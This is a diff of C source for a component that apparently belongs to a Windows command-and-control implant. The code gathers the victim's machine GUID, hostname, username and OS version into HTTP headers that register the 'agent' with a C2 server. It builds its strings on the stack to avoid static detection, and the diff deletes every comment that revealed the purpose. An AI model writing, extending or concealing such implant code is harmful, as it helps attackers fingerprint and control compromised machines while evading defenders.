@@ -1,13 +1,3 @@
-/* identity_headers.c - see identity_headers.h.
- *
- * One writer, one pass: every piece is either a stack-built fixed string
- * (stackstrings.h) or a dynamic ASCII value from system_facts, appended
- * as label+value+CRLF. The MachineGuid registry TEXT is read raw: it must
- * be the plain "xxxxxxxx-xxxx-..." string exactly as C# Guid.ToString()
- * prints it (which is exactly what the registry stores) - the .NET Guid
- * byte reorder get_machine_uuid applies is for binary frames, not headers.
- */
-
 #include "identity_headers.h"
 #include "stackstrings.h"
 #include "string.h"
@@ -19,11 +9,9 @@
 #include "wintypes.h"
 #include "system.h"
 
-/* --- tiny checked writer: every append fails to NULL on overflow ------ */
-
 typedef struct {
     CHAR *cur;
-    CHAR *end;   /* one past the last writable byte */
+    CHAR *end;
     int   ok;
 } hwriter;
 
@@ -44,7 +32,6 @@ static void hw_crlf(hwriter *w)
     hw_putc(w, '\n');
 }
 
-/* One whole header line: label + value + CRLF. */
 static void hw_header(hwriter *w, const CHAR *label, const CHAR *value)
 {
     hw_puts(w, label);
@@ -52,10 +39,6 @@ static void hw_header(hwriter *w, const CHAR *label, const CHAR *value)
     hw_crlf(w);
 }
 
-/* --- machine facts ----------------------------------------------------- */
-
-/* Read the MachineGuid registry TEXT into guid_text (registry order ==
- * Guid.ToString() order); returns 0 on failure (guid_text[0] = 0). */
 static int read_machine_guid_text(CHAR guid_text[40])
 {
     guid_text[0] = '\0';
@@ -70,7 +53,7 @@ static int read_machine_guid_text(CHAR guid_text[40])
     CHAR guidname[12];
     StrMachineGuid(guidname);
 
-    DWORD size = 39; /* 36 chars + NUL */
+    DWORD size = 39;
     if (advapi.RegOpenKeyExA(HKEY_LOCAL_MACHINE, regpath, 0,
                              KEY_QUERY_VALUE, &key) != ERROR_SUCCESS)
         return 0;
@@ -84,7 +67,6 @@ static int read_machine_guid_text(CHAR guid_text[40])
     return ok && guid_text[0] != '\0' ? 1 : 0;
 }
 
-/* Write "value" in decimal (a format literal would sit in .rdata). */
 static void hw_u32_decimal(hwriter *w, UINT32 value)
 {
     CHAR rev[10];
@@ -97,30 +79,22 @@ static void hw_u32_decimal(hwriter *w, UINT32 value)
         hw_putc(w, rev[--n]);
 }
 
-/* --- the block ---------------------------------------------------------- */
-
 USIZE build_identity_headers(CHAR headers[IDENTITY_HEADERS_SIZE])
 {
     hwriter w = { headers, headers + IDENTITY_HEADERS_SIZE, 1 };
     CHAR piece[64];
 
-    /* Fixed lines first: api version, breed, platform, capability mask. */
     StrHdrApiVersion(piece);  hw_puts(&w, piece);  hw_crlf(&w);
     StrHdrNameId(piece);      hw_puts(&w, piece);  hw_crlf(&w);
     StrHdrPlatform(piece);    hw_puts(&w, piece);  hw_crlf(&w);
     StrHdrCaps(piece);        hw_puts(&w, piece);  hw_crlf(&w);
 
-    /* Machine UUID - THE registration key. Optional header: when the
-     * registry read fails the agent is identity-less (visible on the
-     * relay, never registered by the C2) - the connect still proceeds. */
     CHAR guid_text[40];
     if (read_machine_guid_text(guid_text)) {
         StrLblUuid(piece);
         hw_header(&w, piece, guid_text);
     }
 
-    /* Machine facts (hostname/user/OS from one collection pass). Every
-     * dynamic header is optional - an empty value omits the line. */
     system_facts facts;
     collect_system_facts(&facts);
 
@@ -132,7 +106,6 @@ USIZE build_identity_headers(CHAR headers[IDENTITY_HEADERS_SIZE])
     if (facts.username[0] != '\0')
         hw_header(&w, piece, facts.username);
 
-    /* Architecture pair (compile-time; matches the CI matrix triples). */
 #if defined(ENVIRONMENT_x86_64) || defined(__x86_64__) || defined(_M_X64)
     StrValArchX64(piece);
 #elif defined(ENVIRONMENT_ARM64) || defined(__aarch64__) || defined(_M_ARM64)
@@ -146,22 +119,18 @@ USIZE build_identity_headers(CHAR headers[IDENTITY_HEADERS_SIZE])
     if (facts.os_version[0] != '\0')
         hw_header(&w, piece, facts.os_version);
 
-    /* Build number + commit tag (display-only). */
     StrLblBuild(piece);
     hw_puts(&w, piece);
     hw_u32_decimal(&w, (UINT32)ID_BUILD_NUMBER);
     hw_crlf(&w);
 
     StrLblCommit(piece);
-    StrCommitDefault(piece + 32);            /* two pieces in one buffer */
+    StrCommitDefault(piece + 32);
     hw_header(&w, piece, piece + 32);
 
     if (!w.ok)
         return 0;
 
-    /* Room for the final NUL (WinHttpSendRequest takes WCHAR + length, so
-     * the caller converts; the byte block itself needs no NUL, but keep
-     * one so the block is printable in dev logs). */
     if (w.cur >= w.end)
         return 0;
     *w.cur = '\0';
